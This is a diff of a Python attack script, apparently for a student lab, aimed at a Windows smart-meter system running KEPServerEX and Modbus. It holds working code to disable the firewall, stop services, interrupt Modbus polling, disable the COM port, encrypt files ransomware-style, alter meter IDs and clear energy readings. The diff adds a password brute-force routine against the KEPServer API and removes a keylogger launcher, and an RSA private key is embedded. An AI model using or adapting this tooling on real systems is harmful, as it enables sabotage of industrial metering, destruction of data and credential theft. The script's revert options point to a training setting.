@@ -12,7 +12,8 @@ from sys import executable, argv
 from win32netcon import ACCESS_ALL
 from win32net import NetShareAdd
 from time import sleep
-
+import kepconfig
+import pkgutil
 
 copiedpath = "C:\\Windows\\temp\\Smartmeter" # Put shared directory
 smartmeterpath = "C:\\Users\\Student\\Documents\\AttackFolder"
@@ -49,9 +50,9 @@ def copy_file(folder_path):
 def disable_firewall():
     cp = run('netsh advfirewall set allprofiles state off',stdout=PIPE , shell=True)
     if cp.stdout.decode('utf-8').strip() == "Ok.":
-        print("Firewall disabled successfully\nOk.")
+        print("Firewall disabled successfully\nOk.\n")
     else:
-        print("Firewall failed to disable\nFail.")
+        print("Firewall failed to disable\nFail.\n")
 
 #Disable ssh from firewall
 def disable_ssh():
@@ -82,9 +83,9 @@ def disable_ssh():
         print("Outbound Firewall Failed to be Inserted")
 
     if count == 4:
-        print("Firewall Rules added successfully.\nOk.")
+        print("Firewall Rules added successfully.\nOk.\n")
     else:
-        print("Firewall Rules failed to add.\nFail.")
+        print("Firewall Rules failed to add.\nFail.\n")
         
 #Disable Kepserver Service
 def disable_kepserver():
@@ -92,9 +93,9 @@ def disable_kepserver():
     cp = run(["sc", "stop", service_name],stdout=PIPE , check=False)
     output = cp.stdout.decode('utf-8').strip().split()
     if "FAILED" in cp.stdout.decode('utf-8'):
-            print("FAILED: " + " ".join(output[4:]) + "\nFail.")
+            print("FAILED: " + " ".join(output[4:]) + "\nFail.\n")
     else:
-        print("The " + output[1] + " service is " + output[9] + "\nOk.")
+        print("The " + output[1] + " service is " + output[9] + "\nOk.\n")
 
 #Run modpoll to interrupt COM1 port
 def run_modinterrupt():
@@ -105,19 +106,19 @@ def run_modinterrupt():
         cp = run(["sc", "stop", service_name],stdout=PIPE , check=False)
         output = cp.stdout.decode('utf-8').strip().split()
         if "FAILED" in cp.stdout.decode('utf-8'):
-            print("FAILED: " + " ".join(output[4:]) + "\nFail.")
+            print("FAILED: " + " ".join(output[4:]) + "\nFail.\n")
         else:
             print("The " + output[1] + " service is " + output[9])
+            sleep(15)
 
 
-    sleep(5)
+    
 
     current_directory = getcwd()
     executable_path = current_directory + "\\modpoll.exe"
 
     checkmodpoll = run(['modpoll.exe', "-1", "-b", '9600', '-p', 'none', '-m', 'rtu', '-a', '2', 'COM1'], stdout=PIPE, stderr=PIPE, text=True)
 
-    sleep(5)
     if "Polling" in checkmodpoll.stdout:
         print("Modinterrupt is running \nOk.\n")
         parameters = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "2", "COM1"]
@@ -146,9 +147,10 @@ def disable_COMPort():
         f.write(batchscript)
     cp = run(["script.bat"],stdout=PIPE ,shell=True)
     if "successfully" in cp.stdout.decode('utf-8'):
-        print(cp.stdout.decode('utf-8') + "\nOk.")
+        print(cp.stdout.decode('utf-8') + "\nOk.\n")
     else:
-        print("Device not disabled. \nFail.")
+        # print(cp.stdout.decode('utf-8'))
+        print("Device not disabled. \nFail.\n")
 
     remove("script.bat")
     
@@ -200,9 +202,9 @@ def encrypt_Files():
             encrypt(filePath, pubKey)
             print("Encrypted: " + str(filePath))
 
-        print("Encryption Successful.\nOk.")
+        print("Encryption Successful.\nOk.\n")
     except Exception as e:
-        print("Encryption Failed.\nFail.")
+        print("Encryption Failed.\nFail.\n")
 
 def encrypt(dataFile, publicKey):
     '''
@@ -280,23 +282,62 @@ def decrypt(dataFile, privatekey):
 
 #Run modpoll to change register 40201 to 26
 def changeMeterID():
-    current_directory = getcwd()
-    executable_path = current_directory + "\\modpoll.exe"
-    
+
     netshare = run(['sc', 'query', 'KEPServerEXV6'], stdout=PIPE, stderr=PIPE, text=True)
     if "RUNNING" in netshare.stdout:
+        print("Kepserver is running, Stopping now.")
         service_name = "KEPServerEXV6"
         cp = run(["sc", "stop", service_name],stdout=PIPE , check=False)
+        output = cp.stdout.decode('utf-8').strip().split()
+        if "FAILED" in cp.stdout.decode('utf-8'):
+            print("FAILED: " + " ".join(output[4:]) + "\nFail.\n")
+        else:
+            print("The " + output[1] + " service is " + output[9])
+            sleep(15)
+    
+
+    current_directory = getcwd()
+    executable_path = current_directory + "\\modpoll.exe"
 
     parameters = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "25", "-r", "201", "COM1", "26"]
     try:
         check_call([executable_path] + parameters)
-        print("\nOk.")
+
+        sleep(15)
+
+        service_name = "KEPServerEXV6"
+        cp = run(["sc", "start", service_name],stdout=PIPE , check=False)
+        output = cp.stdout.decode('utf-8').strip().split()
+        if "FAILED" in cp.stdout.decode('utf-8'):
+            print("FAILED: " + " ".join(output[4:]))
+            print("Fail.\n")
+        else:
+            print("The " + output[1] + " service is " + output[9])
+
+        print("\nOk.\n")
     except CalledProcessError as e:
         print("Error executing the executable file:", e)
-        print("Fail.")
+        print("Fail.\n")
+
+
 
 def clearEnergyReading():
+
+    netshare = run(['sc', 'query', 'KEPServerEXV6'], stdout=PIPE, stderr=PIPE, text=True)
+    if "RUNNING" in netshare.stdout:
+        print("Kepserver is running, Stopping now.")
+        service_name = "KEPServerEXV6"
+        cp = run(["sc", "stop", service_name],stdout=PIPE , check=False)
+        output = cp.stdout.decode('utf-8').strip().split()
+        if "FAILED" in cp.stdout.decode('utf-8'):
+            print("FAILED: " + " ".join(output[4:]) + "\nFail.\n")
+        else:
+            print("The " + output[1] + " service is " + output[9])
+            sleep(15)
+
+
+    
+
     current_directory = getcwd()
     executable_path = current_directory + "\\modpoll.exe"
     checkEnergy = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "25", "-c", "11", "-1", "-r", "26", "COM1"]
@@ -305,16 +346,48 @@ def clearEnergyReading():
         check_call([executable_path] + checkEnergy)
         check_call([executable_path] + clearEnergy)
         check_call([executable_path] + checkEnergy)
-        print("Energy Reading Cleared.\nOk.")
+        print("Energy Reading Cleared.\nOk.\n")
     except CalledProcessError as e:
         print("Error executing the executable file:", e)
-        print("Fail.")
+        print("Fail.\n")
 
 def runKeylogger():
     current_directory = getcwd()
     executable_path = current_directory + "\\Keylogger.exe"
-    print("Keylogger running successfully.\nOk.")
+    print("Keylogger running successfully.\nOk.\n")
     check_call([executable_path])
+
+def bruteForceKEP():
+
+    netshare = run(['sc', 'query', 'KEPServerEXV6'], stdout=PIPE, stderr=PIPE, text=True)
+    if "RUNNING" not in netshare.stdout:
+        print("Kepserver is not running, Starting now.")
+        service_name = "KEPServerEXV6"
+        cp = run(["sc", "start", service_name],stdout=PIPE , check=False)
+        output = cp.stdout.decode('utf-8').strip().split()
+        if "FAILED" in cp.stdout.decode('utf-8'):
+            print("FAILED: " + " ".join(output[4:]) + "\nFail.\n")
+        else:
+            print("The " + output[1] + " service is " + output[9])
+            sleep(15)
+
+    
+
+    print("Username: Administrator\n")
+    passwords = ["michael", "superman" , "qaz2wsx", "7777777" , "administrator2022"]
+
+    for password in passwords:
+        # Read and print each line in the file
+        server = kepconfig.connection.server(host = '127.0.0.1', port = 57412, user = 'Administrator', pw = password)
+        try:
+            output = server.get_project_properties()
+            with open(copiedpath + "\\KEPServerProperties.txt", "w") as f:
+                f.write(output)
+            print("SUCCESS: " + password + "\nOk.\n")
+            break
+        except Exception as e:
+            print("FAIL: " + password)
+            continue
 
 
 def revert(revertoption):
@@ -322,9 +395,9 @@ def revert(revertoption):
     if revertoption == "1":
         cp = run('netsh advfirewall set allprofiles state on',stdout=PIPE , shell=True)
         if cp.stdout.decode('utf-8').strip() == "Ok.":
-            print("Firewall enabled successfully.\nOk.")
+            print("Firewall enabled successfully.\nOk.\n")
         else:
-            print("Firewall failed to enable.\nFail.")
+            print("Firewall failed to enable.\nFail.\n")
         
     elif revertoption == "2":
         count = 0
@@ -354,18 +427,32 @@ def revert(revertoption):
             print("Outbound Firewall Not Removed (UDP/22)")
 
         if count == 4:
-            print("Revert Success.\nOk.")
+            print("Revert Success.\nOk.\n")
         else:
-            print("Revert Fail.\nFail.")
+            print("Revert Fail.\nFail.\n")
         
     elif revertoption == "3":
+
+        process_name = "modpoll"
+        pid = 0
+
+        for proc in process_iter():
+            if process_name in proc.name():
+               pid = proc.pid
+               break
+        if pid == 0:
+            print("Modpoll not running.")
+        else:
+            kill(pid, signal.SIGTERM)
+            print("Modpoll pid:", pid, "has stopped.")
+
         service_name = "KEPServerEXV6"
         cp = run(["sc", "start", service_name],stdout=PIPE , check=False)
         output = cp.stdout.decode('utf-8').strip().split()
         if "FAILED" in cp.stdout.decode('utf-8'):
-            print("FAILED: " + " ".join(output[4:]) + "\nFail.")
+            print("FAILED: " + " ".join(output[4:]) + "\nFail.\n")
         else:
-            print("The " + output[1] + " service is " + output[9] + "\nOk.")
+            print("The " + output[1] + " service is " + output[9] + "\nOk.\n")
         
     elif revertoption == "4":
         cp = run(["C:\Windows\System32\pnputil.exe", "/enum-devices", "/class", "Ports"],stdout=PIPE ,shell=True)
@@ -382,9 +469,9 @@ def revert(revertoption):
             f.write(batchscript)
         cp = run(["script.bat"],stdout=PIPE ,shell=True)
         if "successfully" in cp.stdout.decode('utf-8'):
-            print(cp.stdout.decode('utf-8') + "\nOk.")
+            print(cp.stdout.decode('utf-8') + "\nOk.\n")
         else:
-            print("Device not enabled. \nFail.")
+            print("Device not enabled. \nFail.\n")
         remove("script.bat")
 
     elif revertoption == "5":
@@ -415,6 +502,9 @@ YL2+s5UCgYEAtm75K4aS+31qeY5NTylL8vhfOXa7OE/tB+lMfAJZJa3EVJkaaLOJ
 QTcMyRL6qY785tS6gL3dktGIYa2s7KfgivBtjmM+ZeFa6ySY7/Kizchobxo/wA9A
 zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
 -----END RSA PRIVATE KEY-----'''
+    
+        #exclude extensions
+        excludeExtension = ['.py','.pem', '.exe']
         
         try:
             for item in recurseFiles(smartmeterpath): 
@@ -424,20 +514,44 @@ zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
                 if fileType in excludeExtension:
                     continue
                 decrypt(filePath, privatekey)
-            print("Decryption Successful.\nOk.")
+            print("Decryption Successful.\nOk.\n")
         except Exception as e:
-            print("Decryption Failed.\nFail.")
+            print("Decryption Failed.\nFail.\n")
 
     elif revertoption == "6":
+
+        netshare = run(['sc', 'query', 'KEPServerEXV6'], stdout=PIPE, stderr=PIPE, text=True)
+        if "RUNNING" in netshare.stdout:
+            print("Kepserver is running, Stopping now.")
+            service_name = "KEPServerEXV6"
+            cp = run(["sc", "stop", service_name],stdout=PIPE , check=False)
+            output = cp.stdout.decode('utf-8').strip().split()
+            if "FAILED" in cp.stdout.decode('utf-8'):
+                print("FAILED: " + " ".join(output[4:]) + "\nFail.\n")
+            else:
+                print("The " + output[1] + " service is " + output[9])
+                sleep(15)
+
+
+        
+
         current_directory = getcwd()
         executable_path = current_directory + "\\modpoll.exe"
         parameters = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "26", "-r", "201", "COM1", "25"]
         try:
             check_call([executable_path] + parameters)
-            print("\nOk.")
         except CalledProcessError as e:
             print("Error executing the executable file:", e)
-            print("Fail.")
+            print("Fail.\n")
+
+        service_name = "KEPServerEXV6"
+        cp = run(["sc", "start", service_name],stdout=PIPE , check=False)
+        output = cp.stdout.decode('utf-8').strip().split()
+        if "FAILED" in cp.stdout.decode('utf-8'):
+            print("FAILED: " + " ".join(output[4:]) + "\nFail.\n")
+        else:
+            print("The " + output[1] + " service is " + output[9] + "\nOk.\n")
+
     elif revertoption == "7":
         process_name = "modpoll"
         pid = 0
@@ -447,10 +561,10 @@ zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
                pid = proc.pid
                break
         if pid == 0:
-            print("Modpoll not running.\nFail.")
+            print("Modpoll not running.\nFail.\n")
         else:
             kill(pid, signal.SIGTERM)
-            print("Modpoll pid:", pid, "has stopped. \nOk.")
+            print("Modpoll pid:", pid, "has stopped. \nOk.\n")
 
     elif revertoption == "8":
         
@@ -462,8 +576,12 @@ zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
         rmdir(copiedpath)
         system('cmd /k "net share SmartMeterfolder /delete"')
         print("Ok.")
+
     elif revertoption == "9":
-        process_name = "keylogger"
+
+        print("\n==================================\n")
+
+        process_name = "modpoll"
         pid = 0
 
         for proc in process_iter():
@@ -471,11 +589,38 @@ zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
                pid = proc.pid
                break
         if pid == 0:
-            print("Keylogger not running.\nFail.")
+            print("Modpoll not running.")
         else:
             kill(pid, signal.SIGTERM)
-            print("Keylogger pid:", pid, "has stopped.\nOk.")
-    elif revertoption == "10":
+            print("Modpoll pid:", pid, "has stopped.")
+
+        print("\n==================================\n")
+
+        netshare = run(['sc', 'query', 'KEPServerEXV6'], stdout=PIPE, stderr=PIPE, text=True)
+        if "RUNNING" in netshare.stdout:
+            print("Kepserver is running, Stopping now.")
+            service_name = "KEPServerEXV6"
+            cp = run(["sc", "stop", service_name],stdout=PIPE , check=False)
+            output = cp.stdout.decode('utf-8').strip().split()
+            if "FAILED" in cp.stdout.decode('utf-8'):
+                print("FAILED: " + " ".join(output[4:]))
+            else:
+                print("The " + output[1] + " service is " + output[9])
+                sleep(15)
+
+
+        
+
+        current_directory = getcwd()
+        executable_path = current_directory + "\\modpoll.exe"
+        parameters = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "26", "-r", "201", "COM1", "25"]
+        try:
+            check_call([executable_path] + parameters)
+        except CalledProcessError as e:
+            print("Error executing the executable file:", e)
+
+        print("\n==================================\n")
+               
         cp = run('netsh advfirewall set allprofiles state on',stdout=PIPE , shell=True)
         if cp.stdout.decode('utf-8').strip() == "Ok.":
             print("Revert Firewall diasble successfull.")
@@ -573,6 +718,7 @@ zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
     -----END RSA PRIVATE KEY-----'''
         
         excludeExtension = ['.py','.pem', '.exe'] # CHANGE THIS
+
         try:
             for item in recurseFiles(smartmeterpath): 
                 filePath = Path(item)
@@ -586,64 +732,26 @@ zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
             print("Decryption Failed")
 
         print("\n==================================\n")
-
-
-        current_directory = getcwd()
-        executable_path = current_directory + "\\modpoll.exe"
-        parameters = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "26", "-r", "201", "COM1", "25"]
-        try:
-            check_call([executable_path] + parameters)
-        except CalledProcessError as e:
-            print("Error executing the executable file:", e)
-
-        print("\n==================================\n")
-
-        process_name = "modpoll"
-        pid = 0
-
-        for proc in process_iter():
-            if process_name in proc.name():
-               pid = proc.pid
-               break
-        if pid == 0:
-            print("Modpoll not running.")
-        else:
-            kill(pid, signal.SIGTERM)
-            print("Modpoll pid:", pid, "has stopped.")
-
-        print("\n==================================\n")
-            
+        
         for root, dirs, files in walk(copiedpath):
             for file in files:
                 og = path.join(root, file)
                 remove(og)
                 print("File: " + str(og) + " is deleted")
-        rmdir(copiedpath)
-        print("Directory: " + str(copiedpath) + " is deleted")
-        system('cmd /k "net share SmartMeterfolder /delete"')
+        try:
+            rmdir(copiedpath)
+            print("Directory: " + str(copiedpath) + " is deleted")
+            system('cmd /k "net share SmartMeterfolder /delete"')
+            print("Success")
+        except Exception as e:
+            print("File not found.")
 
         print("\n==================================\n")
 
-
-        process_name = "keylogger"
-        pid = 0
-
-        for proc in process_iter():
-            if process_name in proc.name():
-               pid = proc.pid
-               break
-        if pid == 0:
-            print("Keylogger not running.")
-        else:
-            kill(pid, signal.SIGTERM)
-            print("Keylogger pid:", pid, "has stopped.")
-
-        print("\n==================================\n")
-
-        print("Reverting everything successfull.\nOk.")
+        print("Reverting successfull.\nOk.\n")
 
     elif revertoption == "-h":
-        print("\n Choose: \n1 to enable firewall, \n2 to re-enable ssh through firewall, \n3 re-enable kepserver service, \n4 re-enable COM port, \n5 decrypt encrypted files, \n6 change meter25 id back, \n7 Kill Modpoll, \n8 remove shared folder, \n9 Kill Keylogger, \n10 Revert Everything.")
+        print("\n Choose: \n1 to enable firewall, \n2 to re-enable ssh through firewall, \n3 re-enable kepserver service, \n4 re-enable COM port, \n5 decrypt encrypted files, \n6 change meter25 id back, \n7 Kill Modpoll, \n8 remove shared folder,\n9 Revert Everything.")
     else:
         print ("Invalid Option! Use option \"-h\" for help!")
 
@@ -651,12 +759,18 @@ if __name__ == '__main__':
     check_admin()
     attackoption = str(argv[1])
     if attackoption == "1":
-        delete_files(smartmeterpath)
-        print("\nOk.")
+        try:
+            delete_files(smartmeterpath)
+            print("\nOk.\n")
+        except Exception as e:
+            print("\nFail.\n")
     elif attackoption == "2":
-        Create_Share_folder()
-        copy_file(smartmeterpath)
-        print("\nOk.")
+        try:
+            Create_Share_folder()
+            copy_file(smartmeterpath)
+            print("\nOk.\n")
+        except Exception as e:
+            print("\nFail.\n")
     elif attackoption == "3":
         disable_firewall()
     elif attackoption == "4":
@@ -677,9 +791,9 @@ if __name__ == '__main__':
         revertoption = str(argv[2])
         revert(revertoption)
     elif attackoption == "12":
-        runKeylogger()
+        bruteForceKEP()
     elif attackoption == "-h":
-        print("\nChoose \n1 to delete file, \n2 to copy file, \n3 to disable firewall, \n4 to disable ssh through firewall, \n5 to disable Kepserver, \n6 to interrupt modbus reading, \n7 to disable COMPORT, \n8 to encrypt files, \n9 change Meter25 Id to 26, \n10 to clearEnergyReading, \n11 to revert with options, \n12 run Keylogger.")
+        print("\nChoose \n1 to delete file, \n2 to copy file, \n3 to disable firewall, \n4 to disable ssh through firewall, \n5 to disable Kepserver, \n6 to interrupt modbus reading, \n7 to disable COMPORT, \n8 to encrypt files, \n9 change Meter25 Id to 26, \n10 to clearEnergyReading, \n11 to revert with options, \n12 bruteforce KEPServer Password.")
 
     else:
         print ("Invalid Option! Use option \"-h\" for help!")
